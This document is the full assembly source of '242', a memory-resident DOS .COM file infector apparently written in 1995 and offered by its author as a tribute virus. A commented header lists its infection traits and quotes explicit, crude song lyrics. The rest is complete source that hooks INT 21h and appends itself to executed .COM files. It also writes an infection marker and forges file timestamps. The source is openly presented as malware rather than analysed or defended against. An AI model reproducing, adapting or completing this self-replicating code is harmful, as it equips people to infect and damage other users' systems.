comment ~

[242] - by Sepultura 1995(c)

Well.. This is my Front-242 Tribute virus...

I figured those crazy Belgians deserve it.. besides keeping me awake while I
was coding Chaos-AD and TCE, they have also been a source of inspiration to
many other coders. The best example is the Amiga demo '242' (I love it |]) by
Fairlight, or perhaps all the quotes from 242 songs and CD covers in all of
Neurobashers viruses.. (BTW: Neurobashing is a 242 song).

It ain't to great, but you cant fit that much in 242 bytes. Speaking of size,
alot of the code may look unoptimized, but that is because I wanted to use
the value 242 as much as possible.. Anyway, here are some stats:

Length: 242 bytes.
Memory Resident Address: 0:242h.
Yohoho Value: AX=242h.
New Date Stamp: 00-02-42.
New Time Stamp: 02:42:00 (Like on the cover of all their CDs).
Size Padding: Files are padded so that the length (Decimal) ends in 242.
The String '242' occurs in this source: 58 times |].

Here's a sample DIR listing of infected files:
----------------------------------------------
 FORMAT   COM        23,242 00-02-42   2:42a
 EDIT     COM         1,242 00-02-42   2:42a
 SYS      COM        10,242 00-02-42   2:42a
 DOSKEY   COM         6,242 00-02-42   2:42a
 CHOICE   COM         2,242 00-02-42   2:42a
 DISKCOMP COM        11,242 00-02-42   2:42a
 DISKCOPY COM        14,242 00-02-42   2:42a
 HELP     COM         1,242 00-02-42   2:42a
 LOADFIX  COM         2,242 00-02-42   2:42a
 MODE     COM        24,242 00-02-42   2:42a
 MORE     COM         3,242 00-02-42   2:42a
 TREE     COM         7,242 00-02-42   2:42a
 UNFORMAT COM        13,242 00-02-42   2:42a
 VSAFE    COM        63,242 00-02-42   2:42a
 COMMAND  COM        55,242 00-02-42   2:42a
----------------------------------------------

As for the virus, it is a memory resident .COM infector, infecting on AH=4B.
There is no INT 24 handler, or clearing of attributes, due to size and stuph.
The first instruction of infect files is:

TEST AL,FFh

That is 0A8h,0FFh. The sum of these two bytes is the same as the sum of 'M'
and 'Z', so that the virus thinks it is an EXE file, and wont infect it..

As a final note, since I back-stabbed Sepultura (the band |]) in Chaos-AD,
by slipping in 'Progress, Protest, Process, No Rest' from the Front 242 song
'Motion', I figured I better back-stab Front 242 too |], so here are some
profanities from the Tricky song 'Abbaon Fat Tracks' as closing words:

Fuck you in,
Tuck you in,
Suck you in,
I am she,
Fists are clutching,
Breast stroke,
Lots of Touching,
        ...
I fuck you in the ass,
Just for A laugh,
With the quick speed,
I'll make your nose bleed.
                        - Tricky.
~
        
        radix   16
        
ofs             =       offset
d_242           =       0f2             ;242 decimal..

        org     0


start:  mov     cx,9                    ;For some reason, having to do with
blah:   push    0                       ;AX=242/i21, all the regs have to
        loop    blah                    ;be 0.. My HD crashed, and I lost my
        popa                            ;interrupt listing, so I couldn't
                                        ;do a proper fix..

        mov     ax,242                  ;Yohoho call..
        int     21
        call    delta                   ;Same ol' shit..
delta:  pop     si
        sub     si,ofs delta
        mov     di,242                  ;DI=242, (i.e. 0:242)        
        pop     es                      ;ES=0.
        cmp     ax,242                  ;'242' resident?
        je      restore                 ;if so, restore the host..

        mov     cx,d_242
        push    si
        rep     movsb
        pop     si                      ;Copy it,
        mov     ds,es
        mov     ax,3521
        int     21                      ;All the +242s, and [242]s are cos
        mov     int_21_seg[242],es      ;the virus is now at offset 242..
        mov     int_21_off[242],bx
        mov     dx,ofs int_21_handler+242
        mov     ah,25                   ;Set INT 21 (I orignally was going to
        int     21                      ;exclude this, as it greatly lessened
                                        ;the chances of a crash, but I also
                                        ;noticed that it stopped '242' from
                                        ;spreading :P

restore:add     si,ofs orig_5           ;Restore the Host file,
        mov     es,cs
        mov     ds,cs
        
        mov     di,100
        push    di
        mov     cx,5
        rep     movsb
        ret                             ;return to cs:100h

        db      '[242]',0,'Sepultura'   ;This is called a Text String

int_21_handler:                         ;The INT 21 handler..
        pushf
        cmp     ax,242                  ;is it the YoHoHo?
        jne     noyohoho                ;if not, skip to the next thang..
        popf
        iret

noyohoho:
        cmp     ah,4b                   ;Execute?
        jne     no_infection            ;if not, dont infect..
        
        pusha
        push    ds

        mov     ax,3d02                 ;open it
        int     21
        jc      open_error              ;error?
        xchg    bx,ax

        mov     ds,cs
        mov     cx,5
        mov     dx,ofs orig_5+242       ;save original 5 bytes..
        mov     ah,3f
        int     21

        mov     ax,W[orig_5][242]
        add     al,ah
        cmp     al,'Z'+'M'              ;is it an EXE or infected file?
        je      infected                ;of so exit..

        call    _se                     ;Seek to end of file..
        cmp     ax,0feff - d_242 - 999  ;File tpo big??
        ja      infected
        sub     ax,5
        jbe     infected                ;too small perhaps?
        mov     jmp_buf[242],ax
        mov     cx,d_242
        mov     dx,242
        call    _wf                     ;Write the virus..

        mov     al,0
        call    _ss                     ;back to the start..

        mov     dx,ofs new_5+242
        mov     cx,5
        call    _wf                     ;write the marker, and the JMP..
                
        call    _se                     ;Down to the bottom, we go..
        mov     cx,3e8                  ;Get modulous of length divided by
        div     cx                      ;1000..
        mov     cx,d_242                ;Get number of bytes needed to pad
        sub     cx,dx                   ;it to XX,242 bytes..
        if b    add cx,3e8              ;carry it up, if needed..
        call    _wf                     ;write the padding..

infected:
        mov     ax,5701                 ;Set Time and Date..
        mov     cx,0001010101000000xB   ;Time = 02:42:00
        mov     dx,0111110000000010xB   ;Date = 00-02-42
        int     21
        mov     ah,3e                   ;close the file,
        int     21

open_error:                             ;and exit..
        pop     ds
        popa

no_infection:                           ;leave INT 21 handler..
        popf

        jmp     1234:5678
int_21_off      =       W[$-4]
int_21_seg      =       W[$-2]

_se:    mov     al,2                    ;Seek to End..
_ss:    mov     ah,42                   ;or beginnig perhaps?
        cwd
        xor     cx,cx
        db      03d
_wf:    mov     ah,40                   ;Write to File..
        int     21
        ret
        
orig_5: db 0cd,20,1,2,3                 ;original 5 bytes..

new_5:  test    al,0ff                  ;Infection Marker (0a8,0ff)
        db      0e9                     ;JMP Near
jmp_buf dw      0                       ;jump offset..
